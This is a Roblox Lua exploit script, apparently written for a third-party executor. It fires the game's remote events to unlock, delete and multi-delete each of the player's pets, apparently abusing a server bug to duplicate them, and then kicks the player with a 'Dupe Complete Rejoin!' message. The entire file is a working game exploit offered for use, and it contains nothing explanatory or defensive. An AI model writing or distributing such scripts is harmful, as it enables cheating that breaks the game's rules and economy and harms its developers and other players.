--// Made by @kylosilly :3
if getthreadcontext() > 7 then
	print("Getting Services...")
	v1 = require
	v_u_2 = function(s) return game:GetService(s) end
	v_u_3 = v_u_2("ReplicatedStorage")
	v4 = v_u_2("Players").LocalPlayer
	v_u_5 = v1(v_u_3.Client.Framework.Services.LocalData)
	v_u_6 = v1(v_u_3.Shared.Utils.Stats.StatsUtil)
	v_u_7 = v1(v_u_3.Shared.Framework.Network.Remote)
	v8 = v_u_5:Get()
	v9 = "Pets"
	v10 = "Pet"
	v11 = "Multi"
	v_u_12 = "Delete"
	v_u_13 = "Unlock"
	v14 = {}
	task.wait(1)
	print("Starting Dupe...")
	for _, v15 in next, v8.Pets do
		v_u_7:FireServer(v_u_13 .. v10, v15.Id, false)
		v_u_7:FireServer(v_u_12 .. v10, v15.Id, 10, false)
		table.insert(v14, v15.Id)
		local args = {
			[1] = v11 .. v_u_12 .. v9,
			[2] = v14
		}
		v_u_7:FireServer(unpack(args))	
		task.wait(0.1)
	end
	v4:Kick("Dupe Complete Rejoin!")
else
	v4:Kick("Executor Not Supported")
end
